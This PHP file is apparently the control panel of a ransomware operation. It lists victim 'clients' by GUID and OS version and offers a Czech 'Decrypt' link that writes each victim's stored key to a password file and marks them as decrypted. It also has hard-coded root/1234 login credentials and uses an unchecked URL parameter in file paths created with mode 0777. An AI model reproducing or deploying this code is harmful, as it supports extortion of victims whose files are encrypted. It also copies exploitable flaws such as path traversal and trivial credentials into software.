<?php

	/**
	 * @author Tomáš Keske
	 */

	require_once "db.php";

	function getPassword($link, $guid){

		if (!($stmt = $link->prepare("SELECT * FROM clients WHERE guid = ?"))) {
	    	echo "Prepare failed: (" . $link->errno . ") " . $link->error;
		}

		$stmt->bind_param("s", $guid);

		$stmt->execute();
	    $result = $stmt->get_result()->fetch_assoc();
	    $stmt->close();

	    return $result["password"];
	}

	function updateDecrypted($link, $guid){
		if (!($stmt = $link->prepare("UPDATE clients SET decrypted = ? , dec_date = ? WHERE guid = ?"))) {
	    	echo "Prepare failed: (" . $link->errno . ") " . $link->error;
		}

		$decrypted = 1;
		$date = date("F j, Y, g:i a");

		$stmt->bind_param("iss", $decrypted, $date, $guid);

		$stmt->execute();

		header('Location: '. $_SERVER["PHP_SELF"]);
	}

	function unlockPassword($link){
		$path = getcwd() . "/clients/" . $_GET["decrypt"];

   		if(!file_exists($path)){
   			mkdir($path, 0777, true);
   		}

   		chdir($path);

    	$file = fopen("password.txt", "w") or die("Unable to open file!");
		fwrite($file, getPassword($link, $_GET["decrypt"]));
		fclose($file);

		updateDecrypted($link, $_GET["decrypt"]);
	}

    function renderTable($link){

	    if (!($stmt = $link->prepare("SELECT * FROM clients"))) {
		    echo "Prepare failed: (" . $link->errno . ") " . $link->error;
		}

		$stmt->execute();
	    $result = $stmt->get_result();
	    $stmt->close();

	    echo "<center><table>";
	    echo "<tr><th>GUID</th><th>Verze OS</th><th>Akce</th><tr>";

	    while ($row = $result->fetch_assoc()) {
	    	if ($row["decrypted"] == 0){
	    		echo "<tr>";
	        	echo "<td>" . $row["guid"] ."</td><td>" . $row["os_version"] . "</td><td>".
	        	 "<a href=\"". $_SERVER["PHP_SELF"] . "?decrypt=" . $row["guid"]. "\">Dešifrovat</a><br></td>";
	        	echo "</tr>";
	    	}
	    }

	    echo "</table></center>";
    }

    function doLogin(){
  		if (empty($_SERVER['PHP_AUTH_USER']) ||
     		$_SERVER['PHP_AUTH_USER'] != "root" ||
     		$_SERVER['PHP_AUTH_PW'] != "1234") {
    		header('WWW-Authenticate: Basic realm="admin"');
    		header('HTTP/1.0 401 Unauthorized');
    		echo 'Zde nemáte přístup bez jména a hesla';
    		exit;
		}
    }

    doLogin();

	if (isset($_GET["decrypt"])){	
    	unlockPassword($link);
    } else {
    	renderTable($link);
    }

?>